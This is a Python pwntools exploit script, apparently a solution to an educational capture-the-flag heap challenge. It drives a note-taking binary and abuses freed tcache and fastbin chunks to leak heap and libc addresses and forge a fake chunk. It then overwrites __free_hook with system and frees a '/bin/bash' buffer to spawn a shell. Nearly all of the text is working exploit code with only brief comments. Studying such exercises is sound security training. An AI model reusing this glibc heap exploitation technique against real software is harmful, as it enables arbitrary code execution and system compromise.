from pwn import *

controlled_note_num = 15
data_size = 0x18

def send_idx(r, idx):
    r.sendlineafter(b'index\n> ', str(idx).encode())

def send_size(r, size):
    r.sendlineafter(b'size\n> ', str(size).encode())

def add_note(r, idx):
    r.sendlineafter(b'> ', b'1')
    send_idx(r, idx)
    r.recvline()

def edit_data(r, idx, size, data, add_lf=True):
    r.sendlineafter(b'> ', b'2')
    send_idx(r, idx)
    send_size(r, size)
    if add_lf:
        r.sendline(data)
    else:
        r.send(data)
    r.recvline()

def del_note(r, idx):
    r.sendlineafter(b'> ', b'3')
    send_idx(r, idx)
    # print(r.recvline())

def show_notes(r):
    r.sendlineafter(b'> ', b'4')
    return r.recvuntil(b'5. bye\n')

def make_fake_data_ptr(r, target):
    for i in range(4): # note + data
        del_note(r, i)
    # ~~~~~~~~~~~~~~~~~~~~~
    # print('controlled note:', controlled_note_num)
    del_note(r, controlled_note_num)
    # still need 7 0x20 chunks to protect the controlled chunk from being moved to tcache
    
    for i in range(4, 11):
        del_note(r, i)

    # remove tcache + 1 fastbin = 8 chunks ======================
    for i in range(4):
        add_note(r, i)
        edit_data(r, i, data_size, b'')

    # remove 7 moved fastbins ===============================
    for i in range(4, 11):
        add_note(r, i)

    # Now we get a controlled Note handler !!!!!!!!!!1 =================
    add_note(r, controlled_note_num) # THE DATA POINTER POINTING TO THE TARGET !!!!!!!!!!!

if __name__ == '__main__':
    context.arch = 'amd64'
    r = process('./chal')
    # r = remote('edu-ctf.zoolab.org', 10015)
    gdb.attach(r)

    add_note(r, 12)

    # leak heap =================
    data_size = 0x18
    add_note(r, 0)
    edit_data(r, 0, data_size, b'')
    add_note(r, 1)
    del_note(r, 0)
    del_note(r, 1)

    add_note(r, 0)
    edit_data(r, 0, data_size, b'')
    heap_base = int.from_bytes(b'\x00' + show_notes(r)[5:10], 'little')
    heap_base &= 0xfffffffff000
    heap_base += 0x290
    print('heap base:', hex(heap_base))
    # Reset arr ========================
    del_note(r, 0)

    # leak main_arena ==================
    # <<<<<<<<< create a controllable chunk <<<<<<<<<<<<<<<<<<<<<<<
    # ----- fake chunk init --------------------------------------------------------
    # Step 1. pointing to the fake chunk, heap_bottom = base + 0x220
    # offset = 0x280 # fake chunk offset, leaving 0x60 space at top
    offset = 8
    target = p64(heap_base + offset) # prudently choose a memory
    print('target:', hex(heap_base + offset))
    '''
    fill tcache + fastbin tail
    '''
    for i in range(4):
        add_note(r, i)
        edit_data(r, i, data_size, b'')
    add_note(r, controlled_note_num)
    struct = p64(0) + target # garbage (fd) + target
    edit_data(r, controlled_note_num, 16, struct, add_lf=False) # use non-allocated area

    # prepare 7 protection blocks
    for i in range(4, 11): # only note
        add_note(r, i)

    # ------------------------------------------------------------------
    make_fake_data_ptr(r, target)

    # Step 2. modify the fake chunk size
    fake_chunk_size = 0x480 # alignment!!!!!!!!!!
    size_data = p64(fake_chunk_size + 1) # prev_in_use
    # we are now editing the fake chunk
    edit_data(r, controlled_note_num, 8, size_data, add_lf=False) 

    



    
    # Step 3. re-pointing to the correct position and free it
    # pointing to 421 chunk
    # clear remaining one tcache chunk (is notes[3]'s struct)
    add_note(r, 13)
    controlled_note_num -= 1
    note_4_offset = 0x290
    target = p64(heap_base + note_4_offset)
    print('2nd target:', hex(heap_base + note_4_offset))
    # ---- important steps --------------------------
    add_note(r, controlled_note_num) # controlled note, use the reamining 40 bytes
    struct = p64(0) + target
    edit_data(r, controlled_note_num, data_size, struct) # edit pointer again
    # -----------------------------------------------
    make_fake_data_ptr(r, target)

    # hold data structure
    for i in range(4, 9):
        edit_data(r, i, 0x78, b'')
    
    # del_note(r, controlled_note_num)
    del_note(r, 12)
    
    add_note(r, 11)   
    edit_data(r, 11, 0x78, b'')
    info = show_notes(r) # slice from unsorted bin

    
    # edit_data(r, 13, 0x78, b'')
    # del_note(r, 11)
    # del_note(r, 13)
    
    start_pos = info.find(b'[11] \n')
    main_arena = info[start_pos+6:start_pos+11]
    print(main_arena)
    main_arena = b'\xe0' + main_arena
    main_arena = int.from_bytes(main_arena, 'little') - 0x400
    main_arena -= 96
    system = main_arena - 0x19a8f0
    free_hook = main_arena + 0x22c8
    malloc_hook = system + 0x19a8e0
    print('main arena:', hex(main_arena))

    del_note(r, 5)
    del_note(r, 4)
    edit_data(r, controlled_note_num, 8, p64(free_hook), add_lf=False)
    add_note(r, 4)
    edit_data(r, 4, 0x78, b'')
    add_note(r, 5)
    edit_data(r, 5, 0x78, p64(system), add_lf=False)

    edit_data(r, 6, 10, b'/bin/bash\x00', add_lf=False)
    del_note(r, 6)
    r.interactive()
